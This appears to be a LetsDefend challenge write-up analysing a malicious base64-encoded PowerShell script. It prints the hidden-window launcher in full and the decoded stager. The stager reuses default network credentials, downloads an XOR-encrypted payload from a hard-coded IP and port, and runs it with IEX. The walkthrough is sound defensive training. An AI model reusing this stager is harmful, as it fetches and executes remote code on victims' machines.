# PowerShell Script - LetsDefend Challenge

### Summary

You've come across a puzzling Base64 script, seemingly laced with malicious intent. Your mission, should you choose to accept it, is to dissect and analyze this script, unveiling its true nature and potential risks. Dive into the code and reveal its secrets to safeguard our digital realm. Good luck on this daring quest!

**Tool Needed:** Cyberchef

**File Location:** C:\Users\LetsDefend\Desktop\script.txt

This challenge prepared by [ZaadoOfc](https://www.linkedin.com/in/zaid-shah-05527a22b/)

**Credit:** csnp.org

### Questions

1. What encoding is the malicious script using?
2. What parameter in the PowerShell script makes it so that the PowerShell window is hidden when executed?
3. What parameter in the PowerShell script prevents the user from closing the process?
4. What line of code allows the script to interact with websites and retrieve information from them?
5. What is the user agent string that is being spoofed in the malicious script?
6. What line of code is used to set the proxy credentials for authentication in the script?
7. When the malicious script is executed, what is the URL that the script contacts to download the malicious payload?

### Findings

1. Lets check the Lab’s VM what is the script inside using notepad.exe.

```powershell
powershell.exe -NoP -sta -NonI -W Hidden -Enc
JABXAEMAPQBOAGUAdwAtAE8AYgBqAEUAYwBUACAAUwB5AFMAVABlAE0ALgBOAEUAVAAuAFcAZQBiAEMAbABpAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAVwBDAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUAByAG8AeABZACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAVAAuAFcARQBCAFIAZQBRAFUARQBzAHQAXQA6ADoARABFAEYAQQB1AEwAdABXAGUAYgBQAHIAbwBYAHkAOwAkAHcAYwAuAFAAUgBPAHgAWQAuAEMAcgBFAGQAZQBuAFQAaQBhAGwAUwAgAD0AIABbAFMAeQBzAFQAZQBtAC4ATgBFAHQALgBDAFIAZQBkAGUATgBUAEkAQQBsAEMAQQBjAEgARQBdADoAOgBEAGUARgBBAFUATABUAE4AZQB0AFcATwByAEsAQwByAGUAZABFAE4AVABpAEEAbABzADsAJABLAD0AJwBJAE0ALQBTACYAZgBBADkAWAB1AHsAWwApAHwAdwBkAFcASgBoAEMAKwAhAE4AfgB2AHEAXwAxADIATAB0AHkAJwA7ACQAaQA9ADAAOwBbAEMASABhAFIAWwBdAF0AJABCAD0AKABbAGMASABhAFIAWwBdAF0AKAAkAHcAYwAuAEQATwB3AE4ATABPAGEARABTAHQAcgBpAE4AZwAoACIAaAB0AHQAcAA6AC8ALwA5ADgALgAxADAAMwAuADEAMAAzAC4AMQA3ADAAOgA3ADQANAAzAC8AaQBuAGQAZQB4AC4AYQBzAHAAIgApACkAKQB8ACUAewAkAF8ALQBCAFgAbwBSACQASwBbACQASQArACsAJQAkAGsALgBMAEUAbgBHAFQASABdAH0AOwBJAEUAWAAgACgAJABCAC0AagBPAEkAbgAnACcAKQA=
```

1. For the above code, we can see that text is encoded after PowerShell command line.

`-NoP` Use this argument if you do not want to load the Windows PowerShell profile

`-sta` Starts PowerShell shell using single threaded apartment. This is the default

`-NonI` If you use the Non-Interactive parameter, PowerShell will not present an interactive prompt to the user

`-W Hidden` Sets the windows style for session. Valid values are `Normal`, `Minimized`, `Maximized` and `Hidden`.

`-Enc` Used to submit complex commands to PowerShell. The Encoded Command parameter accepts a **base-64-encoded string version** of a command.

You may solve no 1-3 question here.

1. From the above understanding, we know that the encoded text are using base-64. Therefore we will use CyberChef to decode and see what is it.

[CyberChef](https://gchq.github.io/CyberChef/)

Adding **FromBase64** Recipe to bake the code! 

![Untitled](PowerShell%20Script%20da6aa286e64b4d718973a8aaf8919e66/Untitled.png)

But the results show a lot null word, therefore we will add **Remove Null Bytes** Recipe to bake again the code!

![Untitled](PowerShell%20Script%20da6aa286e64b4d718973a8aaf8919e66/Untitled%201.png)

1. Outcome of the decoding. Now you may solve No 4 - 7 questions.

```powershell
$WC=New-ObjEcT SySTeM.NET.WebCliENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeADeRS.ADd('User-Agent',$u);$Wc.ProxY = [System.NeT.WEBReQUEst]::DEFAuLtWebProXy;$wc.PROxY.CrEdenTialS = [SysTem.NEt.CRedeNTIAlCAcHE]::DeFAULTNetWOrKCredENTiAls;$K='IM-S&fA9Xu{[)|wdWJhC+!N~vq_12Lty';$i=0;[CHaR[]]$B=([cHaR[]]($wc.DOwNLOaDStriNg("http://98.103.103.170:7443/index.asp")))|%{$_-BXoR$K[$I++%$k.LEnGTH]};IEX ($B-jOIn'')
```

### References

[about PowerShell exe - PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)

[Powershell.exe Command: Syntax, Parameters, And Examples](https://www.itechguides.com/powershell-exe-command/)
